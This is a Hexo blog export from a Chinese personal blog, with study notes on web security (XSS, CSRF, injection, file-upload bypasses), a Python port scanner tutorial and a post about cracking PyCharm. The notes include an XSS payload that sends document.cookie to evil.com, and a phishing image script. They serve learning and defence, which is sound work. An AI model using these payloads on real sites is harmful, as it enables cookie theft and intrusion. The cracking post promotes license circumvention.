{"meta":{"title":"ggy的个人博客","subtitle":"hello,world.","description":"ggy","author":"ggy","url":"https://ggyggy666.github.io"},"pages":[{"title":"about,tags","date":"2020-01-03T04:36:05.000Z","updated":"2020-01-03T04:36:05.780Z","comments":true,"path":"about-tags/index.html","permalink":"https://ggyggy666.github.io/about-tags/index.html","excerpt":"","text":""},{"title":"about","date":"2020-01-03T05:09:02.000Z","updated":"2020-01-03T05:09:02.313Z","comments":true,"path":"about/index.html","permalink":"https://ggyggy666.github.io/about/index.html","excerpt":"","text":""},{"title":"tags","date":"2020-01-03T05:09:34.000Z","updated":"2020-01-03T05:09:34.922Z","comments":true,"path":"tags/index.html","permalink":"https://ggyggy666.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"读《白帽子讲web安全》的收获(二)","slug":"读《白帽子讲web安全》的收获(二)","date":"2020-02-01T12:45:51.000Z","updated":"2020-02-01T14:06:25.235Z","comments":true,"path":"2020/02/01/读《白帽子讲web安全》的收获(二)/","link":"","permalink":"https://ggyggy666.github.io/2020/02/01/%E8%AF%BB%E3%80%8A%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8%E3%80%8B%E7%9A%84%E6%94%B6%E8%8E%B7(%E4%BA%8C)/","excerpt":"紧接着上次所发的文章","text":"紧接着上次所发的文章 这次带来的是收获（二）。 CSRF 12- P3P头运行跨域访问隐私数据- 对于POST请求，可以在某一个网站的html页面构造表单，利用js自动提交表单 点击劫持 12345- 利用iframe的hidden属性隐藏页面，使得用户在不知情下点击- 利用图片覆盖- 利用拖拽数据- 利用Flash（如弄一个小游戏）- 攻击者可能将恶意代码保存在**webstorage**中，实现跨页面攻击 注入 12345678910111213141516171819- SOL注入 注册admin（后面55个空格），可以修改管理员密码- xml注入 &lt;?xml version&#x3D;&quot;1.0&quot; ?&gt; &lt;!DOCTYPE test [ &lt;!ENTITY % system &quot;&quot;&gt; ]&gt; - 代码注入 1. eval, system等函数 2. ?test&#x3D;dd 后面直接加;然后加命令，如： &#96;?arg&#x3D;1;phpinfo()&#96; - CRLF注入 http头没有过滤\\r\\n,导致可以添加HTTP头中的参数，可使用%0d%0a%0d%0a,后面再加payload，如： ?email&#x3D;%0d%0a%0d%0a&lt;script&gt;alert(1)&lt;&#x2F;script&gt; HTTP&#x2F;1.1 文件上传漏洞 123456789101112131415161718192021222324252627282930- 使用0字节阶段 如：只允许上传JPG图片，那么可以构造文件名后缀：xxx.php[\\0].JPG- 将正常图片和PHP文件合并 检测图片的文件开头，那么可以将PHP文件合并到图片的尾部- 利用apache文件解析漏洞 Apache对于文件名的解析是从后往前的，如果仅仅检测是否为rar文件，那么可以将一个PHP文件命名为：xxx.php.rar.rar - 利用IIS文件解析问题 使用;截断，如：abc.asp;xx.jpg 会被检测为 abc.asp。 处理文件拓展名出错：&#x2F;path&#x2F;xyz.asp&#x2F;abc.jpg 会将xyz.asp目录下的所有文件都作为ASP文件解析，比如这个abc.jpg就会被认为是ASP类型的。原因就是因为目录名有.asp。 以上的两个漏洞，都需要文件确实存在，如那个xxx.jpg。如果能够控制更改文件目录的名字就可以改为.asp了。- PHP CGI路径解析问题 访问...&#x2F;path&#x2F;test.jpg&#x2F;noexisten.php时,会把test.jpg当做PHP文件执行，而noexisten.php是不存在的。因此如果上传的图片内容是php文件类型的，然后在访问这个图片的URL链接后面加上&#x2F;xxx.php就可以把它当做PHP执行，从而执行里面的代码。- 利用上传文件钓鱼 如果是普通的钓鱼可能容易被发现URL的不一致。那么可以在正规网站上传图片，图片内容可以导向钓鱼网站，这样用户就会以为打开的只是一个正常图片。比如： 1. 上传了一张图片，地址为：http:&#x2F;&#x2F;...&#x2F;uploads&#x2F;xxx.jpg 2. 而图片内容是： png(正常的图片开头，绕过某些检测） &lt;script language&#x3D;&quot;javascript:&quot;&gt; var c &#x3D; window.location.tostring(); if(c.indexof(&quot;?&quot;) !&#x3D; -1 &#123; var i &#x3D; c.split(&quot;?&quot;)[1]; if(i.split(&quot;_&quot;)[0]&#x3D;&#x3D;1) &#123; location.href &#x3D; &#39;http:&#x2F;&#x2F;evil.com&#x2F;xxx.asp?id&#x3D;&#39; + i.split(&quot;_&quot;)[1]; else &#123; location.href &#x3D; &#39;http:&#x2F;&#x2F;evil.com&#x2F;xxx.asp?id&#x3D;&#39; + i.split(&quot;_&quot;)[1]; &#125; &#125; &lt;&#x2F;script&gt;","categories":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"读《白帽子讲web安全》的收获(二)","slug":"读《白帽子讲web安全》的收获-二","permalink":"https://ggyggy666.github.io/tags/%E8%AF%BB%E3%80%8A%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8%E3%80%8B%E7%9A%84%E6%94%B6%E8%8E%B7-%E4%BA%8C/"}],"keywords":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}]},{"title":"GG转码器","slug":"GG转码器","date":"2020-01-31T12:06:45.000Z","updated":"2020-01-31T12:22:01.212Z","comments":true,"path":"2020/01/31/GG转码器/","link":"","permalink":"https://ggyggy666.github.io/2020/01/31/GG%E8%BD%AC%E7%A0%81%E5%99%A8/","excerpt":"今天学习了如何使用python编写一款转码器。","text":"今天学习了如何使用python编写一款转码器。 虽然转码可以使用在线网站或者burp的转码功能，但我更喜欢直接点开一个软件使用，何况还是自己敲出来的。虽然看起来是比较简陋了点。。。 使用效果输入要编码的字符，再点击“转码” 可以看到在对应的输入框中都输出了编码后相应的字符。也可以点击每一个输入框后面的“解码”按钮进行解码，如：当然也可以在每一个输入框中输入想要编码的字符串然后点击“编码”按钮：我把它放到了我的GitHub上，有兴趣的可以去看看。","categories":[{"name":"工具","slug":"工具","permalink":"https://ggyggy666.github.io/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"GG转码器","slug":"GG转码器","permalink":"https://ggyggy666.github.io/tags/GG%E8%BD%AC%E7%A0%81%E5%99%A8/"}],"keywords":[{"name":"工具","slug":"工具","permalink":"https://ggyggy666.github.io/categories/%E5%B7%A5%E5%85%B7/"}]},{"title":"读《白帽子讲web安全》的收获(一)","slug":"读《白帽子讲web安全》的收获(一)","date":"2020-01-30T13:37:30.000Z","updated":"2020-02-01T14:07:20.452Z","comments":true,"path":"2020/01/30/读《白帽子讲web安全》的收获(一)/","link":"","permalink":"https://ggyggy666.github.io/2020/01/30/%E8%AF%BB%E3%80%8A%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8%E3%80%8B%E7%9A%84%E6%94%B6%E8%8E%B7(%E4%B8%80)/","excerpt":"从放假就开始看的《白帽子讲web安全》终于（粗略地）看完了，在此简单总结一下收获。","text":"从放假就开始看的《白帽子讲web安全》终于（粗略地）看完了，在此简单总结一下收获。 本篇为收获（一）。 安全问题就是信任问题 设计安全方案的技巧 - Secure By Default原则 1. 黑名单、白名单 2. 最小权限原则 - 纵深防御原则（不同层面都要考虑周全） - 数据与代码分离原则 - 不可预测性原则 同源策略 a.com加载了b.com的js,这个js就是运行在a.com中的了，所以其Origin就应该是a.com。可通过检测HTTP头，采用CSP。（返回头中含 X-Content-Security-Policy:…) xss 实质：将用户的输入当成代码执行了。 - 窃取cookie 1. 先加载一个脚本http://www.aaa.com/test.html?abc=&quot;&gt;&lt;script src=http://www.evil.com/evil.js&gt;&lt;/script&gt; 2. 在远程脚本（evil.com中的evil.js)输入： var img = document.getElement(&quot;img&quot;) img.src = &quot;http://www.evil.com/log?&quot;+escape(document.cookie); document.body.appendChild(img); 通过向页面插入了一张看不见的图片，盗取cookie（有httponly就不行了） - 构造GET和POST请求 上面的第2点中的代码就是一个GET请求。 POST请求可以使用form表单，或者直接写HTML代码，或者通过XmlHttpRequeste发送（使用ajax） - 根据浏览器特有标识识别浏览器、还可识别用户安装的软件 - 通过CSS，访问过某个网站，颜色会不同 - xss构造技巧 1. 字符编码 输入被&quot;&quot;包着，对双引号进行\\转义，可以用%c1&quot;,因为%c1与\\组成新字符，把\\吃掉 2. 绕过长度限制 - 利用location.hash 可以输入&quot; onclick=&quot;eval(location.hash.substr(1))&quot;/ ,然后再URL中后面输入#alert(1) - 利用注释符 对于可控的多行输入，在第一行输入：&quot;&gt;&lt;!-- ,在后面一行输入：--&gt;&lt;script&gt;alert(1)&lt;/script&gt; - 利用window.name 在a.com中对window.name赋值，然后导向b.com中，那么b.com中的window.name是同一个。 &lt;script&gt; window.name = &quot;alert(document.cookie)&quot;; location.href = &quot;http://www.xsstest/xss.php&quot;; &lt;/script&gt; 再在定向到的www.xsstest/xss.php中写入：eval(name); - xss回旋镖 B上存在反射型xss,A上存在存储型xss,可以在A上的xss中嵌入B的xss。 在A上写一个form表单，自动提交到B，B中再跳转回A。 3.Dom型xss重点关注 1. 所有inputs框 2. window.location(href,hash等) 3. window.name 4. document.referer 5. document.cookie 6. localstorage 7. XMLHttpRequest返回的数据-","categories":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"读《白帽子讲web安全》的收获(一)","slug":"读《白帽子讲web安全》的收获-一","permalink":"https://ggyggy666.github.io/tags/%E8%AF%BB%E3%80%8A%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8%E3%80%8B%E7%9A%84%E6%94%B6%E8%8E%B7-%E4%B8%80/"}],"keywords":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}]},{"title":"端口扫描工具的编写","slug":"使用python编写端口扫描工具","date":"2020-01-22T13:39:46.312Z","updated":"2020-01-25T01:10:57.435Z","comments":true,"path":"2020/01/22/使用python编写端口扫描工具/","link":"","permalink":"https://ggyggy666.github.io/2020/01/22/%E4%BD%BF%E7%94%A8python%E7%BC%96%E5%86%99%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/","excerpt":"新的一年就要到来了，我的博客也该更新了。","text":"新的一年就要到来了，我的博客也该更新了。 今天又是一个大好的日子。我学会了如何使用python编写一个简单的端口扫描工具，收获颇多，特来分享。所谓“万事开头难”，因此在开始进行编写之前，我们首先得理清一下编写这样一个工具需要的流程是什么。 根据工具名便可以判断出，我们需要使用一些python自带的库来进行端口的扫描。 一个机器的端口有很多，我们需要循环去判断它是否开放。如果一个一个的去扫，势必要花费很多时间，因此需要使用多线程来达到减少运行时间的目的。 理清了这样一条思路，我们便可以一步步地去实现它。 利用socket库实现TCP端口扫描 要想利用socket库，首先得了解一下它的用法。菜鸟教程里有它的完整使用方法，可自行了解。讲一下我们将要用到的socket函数。首先是： socket.socket([family[, type[, proto]]]) socket又称“套接字”，从上面便可以看出。但其实上面那行代码并不好理解，因此可以换成另一种形式： socket(int domain, int type, int protocol) 看看它们各自都代表了什么： domain：协议域，又称协议族（family），可以是AF_UNIX或AF_INET（使用32位的ipv4地址和16位的端口号组合）或AF_INET6等。 type：知道socket类型。常用的有面向连接的SOCK_STREAM和面向非连接的SOCK_DGRAM。 protocol，一般不填默认为0。 具体信息可以看这篇文章,我们要用到面向连接的ipv4地址进行扫描，因此socket函数就可以是： client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 将这个函数对象赋给client（客户端），然后使用这个对象进行连接： client.connect((target, port)) 注意connect中的数据类型是元组类型。target即为ipv4地址，port为要扫描的端口。这便是进行了一次扫描，然后将结果打印出来，最后需要用close()关闭。（可以将它想象成对一个文件的操作）封装成一个portscan函数：这里还使用了try-except，以防程序产生异常后就退出。 使用多线程运行扫描函数 要使用到多线程，就需要用到python库中的Thread库。它的具体用法可以查看苍松的博客。我们这里用到只是它的最简单的用法。 Thread(group=None, target=None, name=None, args=(), kwargs={}) 上面的是完整的函数参数，只关注我们需要的即可。这里的target不是上文中提到的需要扫描的ipv4地址，而是要执行的方法（函数），可以填入我们的portscan。然后后面的args参数值就填传入的参数，即ipv4地址和端口。 t = Thread(target=portscan, args=(target, port)) 注意target的参数值只需要填函数名，不用()，args的参数值一样需要是元组类型。然后使用： t.start() 来启动线程。由于我们需要遍历端口观察它是否开放，因此可以将启动多线程这步放到一个遍历端口的循环中。这里只遍历到1024端口。为了方便扫描，ipv4地址需要自己输入，然后传入main函数中。还可以使用time库计算处运行所需的时间。不要忘了导入所需要用到的库哦。 最终效果如下：端口扫描工具就这样做好啦！虽然看起来简单，代码很少，但是还是需要动手去实现才能体会到其中艰难，才会更有效果。对了，忘记提一句。这里的ipv4地址是我本机的地址，可以通过： win+R -&gt; 输入cmd -&gt; 输入ipconfig -&gt;查看‘无线局域网适配器 WLAN:’的IPv4地址 得到。当然，扫描域名也是可以的。打包后的代码放到了我的github上。今天就到这里了，期待下一次能学到更多有趣的东西。 扫描下方的二维码，更多精彩文章等你来看哦。","categories":[{"name":"python","slug":"python","permalink":"https://ggyggy666.github.io/categories/python/"}],"tags":[{"name":"使用pycharm编写简单的端口扫描工具","slug":"使用pycharm编写简单的端口扫描工具","permalink":"https://ggyggy666.github.io/tags/%E4%BD%BF%E7%94%A8pycharm%E7%BC%96%E5%86%99%E7%AE%80%E5%8D%95%E7%9A%84%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/"}],"keywords":[{"name":"python","slug":"python","permalink":"https://ggyggy666.github.io/categories/python/"}]},{"title":"永久破解pycharm2019-2.3的方法","slug":"永久破解pycharm2019-2.3的方法","date":"2020-01-15T16:11:09.000Z","updated":"2020-01-25T01:07:56.353Z","comments":true,"path":"2020/01/16/永久破解pycharm2019-2.3的方法/","link":"","permalink":"https://ggyggy666.github.io/2020/01/16/%E6%B0%B8%E4%B9%85%E7%A0%B4%E8%A7%A3pycharm2019-2.3%E7%9A%84%E6%96%B9%E6%B3%95/","excerpt":"朋友们，该学习python了。","text":"朋友们，该学习python了。 本人由于想要使用pycharm来学习python，但又苦于没有钱买正版，于是找了几个小时的破解教程。但是网上的教程大多数都是挺久以前的了，使用的激活码等已经不能用了。就在我几欲放弃之时，终于被我找到了真实有效的破解教程啦！ 直接给出原文链接吧，我就不在此赘述了。樱花庄的小樱需要注意的是：最后一步激活时原文是直接等待它自动弹出链接地址，但是我没有等到它弹出来就自己先把那个地址填上去了，再点击激活就OK了。如果出现无法链接的情况，可先尝试关掉再重启pycharm，再按以上步骤重试一遍即可。 来看看我最终成功的图片：哈哈，从此我就走上py之路啦！","categories":[{"name":"工具","slug":"工具","permalink":"https://ggyggy666.github.io/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"永久破解pycharm2019-2.3的方法","slug":"永久破解pycharm2019-2-3的方法","permalink":"https://ggyggy666.github.io/tags/%E6%B0%B8%E4%B9%85%E7%A0%B4%E8%A7%A3pycharm2019-2-3%E7%9A%84%E6%96%B9%E6%B3%95/"}],"keywords":[{"name":"工具","slug":"工具","permalink":"https://ggyggy666.github.io/categories/%E5%B7%A5%E5%85%B7/"}]},{"title":"个人博客简述","slug":"个人博客简述","date":"2020-01-03T05:26:50.000Z","updated":"2020-01-25T01:16:42.833Z","comments":true,"path":"2020/01/03/个人博客简述/","link":"","permalink":"https://ggyggy666.github.io/2020/01/03/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%AE%80%E8%BF%B0/","excerpt":"这是我的第一个博客从今天开始就正式上线啦！","text":"这是我的第一个博客从今天开始就正式上线啦！ 至于为什么会突然想写一些东西，谁知道呢，嘻嘻。好吧，其实是因为在期末写了几篇结课论文后，感觉将从网上所学会的东西用文字记录下来能理解的更深、更透彻，而且由于太久没写文章，感觉自己的写作水平急剧下降，于是产生了写博客的想法。不过搭建博客的路程真是艰辛呐，从前天开始就一直在百度、CSDN、谷歌、必应上畅游。找教程、找问答、然后动手实践。但其实大多数时间都花在了解决遇到的各种问题上，害，真的一言难尽啊。所幸在我的坚持不懈下，终于初步建成了它。包括你现在看到的这篇简述，也是在学会了一点markdown语法后写出的。写得很不成熟，但请不要介意。在未来，可能会偶尔更新一下它，将自己所学的东西记录下来，也算是一个成长过程的见证吧。【暂定内容主要包括python、web安全吧(目前学习方向)】欢迎关注我！ 扫描下方的二维码，精彩文章等你来看哦。","categories":[{"name":"home","slug":"home","permalink":"https://ggyggy666.github.io/categories/home/"}],"tags":[{"name":"简述 2020年","slug":"简述-2020年","permalink":"https://ggyggy666.github.io/tags/%E7%AE%80%E8%BF%B0-2020%E5%B9%B4/"}],"keywords":[{"name":"home","slug":"home","permalink":"https://ggyggy666.github.io/categories/home/"}]},{"title":"Hello World","slug":"hello-world","date":"2020-01-03T03:06:05.756Z","updated":"2020-01-21T12:55:12.971Z","comments":true,"path":"2020/01/03/hello-world/","link":"","permalink":"https://ggyggy666.github.io/2020/01/03/hello-world/","excerpt":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[{"name":"home","slug":"home","permalink":"https://ggyggy666.github.io/categories/home/"}],"tags":[{"name":"博客的使用方法","slug":"博客的使用方法","permalink":"https://ggyggy666.github.io/tags/%E5%8D%9A%E5%AE%A2%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/"}],"keywords":[{"name":"home","slug":"home","permalink":"https://ggyggy666.github.io/categories/home/"}]}]}